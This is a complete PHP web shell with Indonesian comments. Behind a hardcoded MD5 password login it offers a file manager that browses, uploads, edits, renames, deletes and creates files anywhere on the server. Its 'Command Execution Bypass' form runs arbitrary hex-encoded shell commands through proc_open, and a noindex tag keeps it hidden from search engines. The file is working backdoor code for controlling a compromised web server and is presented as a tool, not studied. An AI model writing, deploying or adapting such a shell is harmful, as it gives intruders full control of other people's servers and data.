<?php
session_start();

$username = "greenday";
$passwordHash = "05bc6b005e8e93cf1f9247e5cabb217c";

// Autentikasi
if (isset($_POST['username']) && isset($_POST['password'])) {
    $inputUsername = $_POST['username'];
    $inputPassword = md5($_POST['password']);

    if ($inputUsername === $username && $inputPassword === $passwordHash) {
        $token = generateUUID(); // Fungsi generateUUID dijelaskan di bawah
        $_SESSION['token'] = $token;
        $_SESSION['authenticated'] = true;
        $_SESSION['username'] = $username;
    } else {
        echo "Login gagal!";
        exit;
    }
}


if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    ?>
    <form method="POST">
        <label>Username:</label>
        <input name="username"><br>
        <label>Password:</label>
        <input type="password" name="password"><br>
        <input type="submit" value="Login">
    </form>
    <?php
    exit;
}

$dir = isset($_GET['dir']) ? hex2bin($_GET['dir']) : '.';
$files = scandir($dir);
$upload_message = '';
$edit_message = '';
$delete_message = '';

function get_file_permissions($file): string {
    return substr(sprintf('%o', fileperms($file)), -4);
}

function is_writable_permission($file): bool {
    return is_writable($file);
}

function executeCommand($command, $workingDirectory = null)
{
    $descriptorspec = array(
       0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
       1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
       2 => array("pipe", "w")   // stderr is a pipe that the child will write to
    );

    $process = proc_open($command, $descriptorspec, $pipes, $workingDirectory);

    if (is_resource($process)) {
        // Read output from stdout and stderr
        $output_stdout = stream_get_contents($pipes[1]);
        $output_stderr = stream_get_contents($pipes[2]);

        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);

        $return_value = proc_close($process);

        return "Output (stdout):\n" . $output_stdout . "\nOutput (stderr):\n" . $output_stderr;
    } else {
        return "Failed to execute command.";
    }
}

if (isset($_GET['636d64'])) {
    $command = hex2bin($_GET['636d64']);
    $result = executeCommand($command, $dir);
}

if (isset($_FILES['file_upload'])) {
    if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $dir . '/' . $_FILES['file_upload']['name'])) {
        $upload_message = 'File berhasil diunggah.';
    } else {
        $upload_message = 'Gagal mengunggah file.';
    }
}

if (isset($_POST['edit_file'])) {
    $file = $_POST['edit_file'];
    $content = file_get_contents($file);
    if ($content !== false) {
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Edit File</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    margin: 0;
                    padding: 0;
                    text-align: center;
                }
                header {
                    background-color: #4CAF50;
                    color: white;
                    padding: 1rem;
                }
                header h1 {
                    margin: 0;
                }
                main {
                    padding: 1rem;
                }
                form {
                    width: 50%;
                    margin: auto;
                    text-align: left;
                }
                textarea {
                    width: 100%;
                    height: 300px;
                }
                input[type="submit"] {
                    background-color: #4CAF50;
                    border: none;
                    color: white;
                    cursor: pointer;
                    margin-top: 1rem;
                    padding: 0.5rem 1rem;
                    text-align: center;
                    text-decoration: none;
                    display: inline-block;
                    font-size: 12px;
                }
                input[type="submit"]:hover {
                    background-color: #45a049;
                }
                .btn {
                    background-color: #4CAF50;
                    border: none;
                    color: white;
                    cursor: pointer;
                    margin-left: 1rem;
                    padding: 0.5rem 1rem;
                    text-align: center;
                    text-decoration: none;
                    display: inline-block;
                    font-size: 12px;
                }

                .btn-download {
                    background-color: #008CBA; /* Ganti warna sesuai kebutuhan */
                    border: none;
                    color: white;
                    cursor: pointer;
                    margin-left: 1rem;
                    padding: 0.5rem 1rem;
                    text-align: center;
                    text-decoration: none;
                    display: inline-block;
                    font-size: 12px;
                }

                .btn:hover {
                    background-color: #45a049;
                }
            </style>
        </head>
        <body>
            <header>
                <h1>Edit File</h1>
            </header>
            <main>
                <form method="post" action="">
                    <textarea id="CopyFromTextArea" name="file_content" rows="10" class="form-control"><?php echo htmlspecialchars($content); ?></textarea>
                    <input type="hidden" name="edited_file" value="<?php echo htmlspecialchars($file); ?>">
                    <input type="submit" name="submit_edit" value="Submit">
                </form>
            </main>
        </body>
        </html>
        <?php
        exit;
    } else {
        $edit_message = 'Gagal membaca isi file.';
    }
}

if (isset($_POST['submit_edit'])) {
    $file = $_POST['edited_file'];
    $content = $_POST['file_content'];
    if (file_put_contents($file, $content) !== false) {
        $edit_message = 'File berhasil diedit.';
    } else {
        $edit_message = 'Gagal mengedit file.';
    }
}
if (isset($_POST['rename_file']) && isset($_POST['new_filename'])) {
    $old_file = $_POST['rename_file'];
    $new_filename = $_POST['new_filename'];
    $new_file = dirname($old_file) . '/' . $new_filename;
    
    if (rename($old_file, $new_file)) {
        echo "File berhasil diubah nama menjadi $new_filename";
    } else {
        echo "Gagal mengubah nama file";
    }
}

if (isset($_POST['delete_file'])) {
    $file = $_POST['delete_file'];
    if (unlink($file)) {
        $delete_message = 'File berhasil dihapus.';
    } else {
        $delete_message = 'Gagal menghapus file.';
    }
}

$uname = php_uname();
$current_dir = realpath($dir);

function generateUUID()
{
    return sprintf(
        '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff)
    );
}
if (isset($_POST['create_file_submit'])) {
    $file_name = $_POST['create_file_name'];
    if (!empty($file_name)) {
        $file_path = $dir . '/' . $file_name;
        if (!file_exists($file_path)) {
            if (file_put_contents($file_path, '') !== false) {
                // File berhasil dibuat
                echo "<p>File '$file_name' berhasil dibuat.</p>";
            } else {
                // Gagal membuat file
                echo "<p>Gagal membuat file '$file_name'.</p>";
            }
        } else {
            // File sudah ada
            echo "<p>File '$file_name' sudah ada.</p>";
        }
    } else {
        // Nama file kosong
        echo "<p>Nama file tidak boleh kosong.</p>";
    }
}

if (isset($_POST['create_folder_submit'])) {
    $folder_name = $_POST['create_folder_name'];
    if (!empty($folder_name)) {
        $folder_path = $dir . '/' . $folder_name;
        if (!file_exists($folder_path)) {
            if (mkdir($folder_path)) {
                // Folder berhasil dibuat
                echo "<p>Folder '$folder_name' berhasil dibuat.</p>";
            } else {
                // Gagal membuat folder
                echo "<p>Gagal membuat folder '$folder_name'.</p>";
            }
        } else {
            // Folder sudah ada
            echo "<p>Folder '$folder_name' sudah ada.</p>";
        }
    } else {
        // Nama folder kosong
        echo "<p>Nama folder tidak boleh kosong.</p>";
    }
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<title><?php echo $_SERVER['HTTP_HOST']; ?></title>
    <meta name="robots" content="noindex, nofollow">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
        }
        header {
            background-color: #4CAF50;
            color: white;
            padding: 1rem;
        }
        header h1 {
            margin: 0;
        }
        main {
            padding: 1rem;
        }
        table {
            border-collapse: collapse;
            margin: 1rem auto;
            width: 100%;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 3px 10px 3px 15px;
            text-align: left;
        }
		a {
    font-size: 15px;
}
        th {
            background-color: #f2f2f2;
        }
        tr:nth-child(even) {
            background-color: #f2f2f2;
        }
        tr:hover {
            background-color: #ddd;
        }
        form {
            display: inline-block;
            margin: 0;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            border: none;
            color: white;
            cursor: pointer;
            margin-left: 1rem;
            padding: 0.5rem 1rem;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 12px;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        /* Gaya CSS untuk hasil command */
        div {
            background-color: #f9f9f9;
            border: 1px solid #ddd;
            padding: 10px;
            margin-top: 20px;
            overflow: auto;
        }

        pre {
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .btn {
            background-color: #4CAF50;
            border: none;
            color: white;
            cursor: pointer;
            margin-left: 1rem;
            padding: 0.5rem 1rem;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 12px;
        }

        .btn-download {
            background-color: #008CBA; /* Ganti warna sesuai kebutuhan */
            border: none;
            color: white;
            cursor: pointer;
            margin-left: 1rem;
            padding: 0.2rem 1rem;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 12px;
        }

        .btn:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <header>
     <h1><?php echo $_SERVER['HTTP_HOST']; ?></h1>
    </header>
   <main>
        
<p>Current directory:
<?php 
// Memecah jalur direktori menjadi setiap bagian folder
$folders = explode('/', $current_dir);

// Inisialisasi jalur untuk membangun tautan
$currentPath = '';

// Iterasi setiap bagian folder untuk membuat tautan
foreach ($folders as $folder) {
    // Tambahkan bagian folder saat ini ke jalur
    $currentPath .= $folder . '/';
    // Tautan untuk bagian folder saat ini
    echo '<a href="?dir=' . bin2hex($currentPath) . '">' . $folder . '</a>/';
}
?>
</p>




		
        <p>Server information: <?php echo $uname; ?></p>
        <?php if (!empty($upload_message)): ?>
        <p><?php echo $upload_message; ?></p>
        <?php endif; ?>
        <?php if (!empty($edit_message)): ?>
        <p><?php echo $edit_message; ?></p>
        <?php endif; ?>
        <?php if (!empty($delete_message)): ?>
        <p><?php echo $delete_message; ?></p>
        <?php endif; ?>
        <form method="POST" enctype="multipart/form-data">
            <label>Upload file:</label>
            <input type="file" name="file_upload">
            <input type="submit" value="Upload">
            <input type="hidden" name="dir" value="<?php echo $dir; ?>">
        </form>

        <form method="POST">
            <label>Create File:</label>
            <input type="text" name="create_file_name">
            <input type="submit" name="create_file_submit" value="Create File">
        </form>

        <form method="POST">
            <label>Create Folder:</label>
            <input type="text" name="create_folder_name">
            <input type="submit" name="create_folder_submit" value="Create Folder">
        </form>

       <!-- List folders and files -->
<h2>Folders and Files</h2>
<table>
    <tr>
        <th>Name</th>
        <th>Type</th>
        <th>Permissions</th>
        <th>Actions</th>
    </tr>
    <?php 
    foreach ($files as $file): 
        if (is_dir($dir . '/' . $file)): ?>
            <tr>
                <td>
                    <a href="?dir=<?php echo bin2hex($dir . '/' . $file); ?>" style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'inherit' : 'red'; ?>"><?php echo $file; ?></a>
                </td>
                <td>
                    Folder
                </td>
                <td style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'green' : 'red'; ?>">
                    <?php echo is_writable_permission($dir . '/' . $file) ? 'Writable' : 'No writable'; ?>
                </td>
                <td>
                    <!-- Actions for folders -->
                </td>
            </tr>
    <?php 
        endif;
    endforeach; ?>

    <?php 
    foreach ($files as $file): 
        if (is_file($dir . '/' . $file)): ?>
            <tr>
                <td>
                    <a href="a.php?dir=<?php echo bin2hex($dir); ?>&editfile=<?php echo urlencode($file); ?>" style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'inherit' : 'red'; ?>"><?php echo $file; ?></a>
                </td>
                <td>
                    File
                </td>
                <td style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'green' : 'red'; ?>">
                    <?php echo is_file($dir . '/' . $file) ? get_file_permissions($dir . '/' . $file) : (is_writable_permission($dir . '/' . $file) ? 'Writable' : 'No writable'); ?>
                </td>
                <td>
					<form action="" method="post" style="display: inline-block;">
    <input type="hidden" name="rename_file" value="<?php echo $dir . '/' . $file; ?>">
    <input type="text" name="new_filename" placeholder="New filename">
    <button type="submit" class="btn btn-download">Rename</button>
</form>
                    <form action="" method="post" style="display: inline-block;">
                        <input type="hidden" name="edit_file" value="<?php echo $dir . '/' . $file; ?>">
                        <button type="submit" class="btn btn-download">Edit</button>
                    </form>
                    <form action="" method="post" style="display: inline-block;">
                        <input type="hidden" name="delete_file" value="<?php echo $dir . '/' . $file; ?>">
                        <button type="submit" class="btn btn-download">Delete</button>
                    </form>
                    <form action="" method="get" style="display: inline-block;">
                        <input type="hidden" name="download" value="<?php echo bin2hex($dir . '/' . $file); ?>">
                        <button type="submit" class="btn btn-download">Download</button>
                    </form>
                </td>
            </tr>
    <?php 
        endif;
    endforeach; ?>
</table>
        <p><b>Command Execution Bypass</b></p>
        <form method="GET">
            <label>Encode your command on <b><a href="https://gfupload.com/">Encode Disini!</a></b>:</label><br><br>
            <input type="hidden" name="dir" value="<?php echo bin2hex($dir); ?>">
            <input type="text" name="636d64" placeholder="e.g., 6c73306c 616c6c"><br><br>
            <input type="submit" value="Execute">
        </form>
        <?php if (isset($result)): ?>
        <div>
            <h2>Command Result:</h2>
            <pre><?php echo htmlspecialchars($result); ?></pre>
        </div>
        <?php endif; ?>
    </main>
</body>
</html>
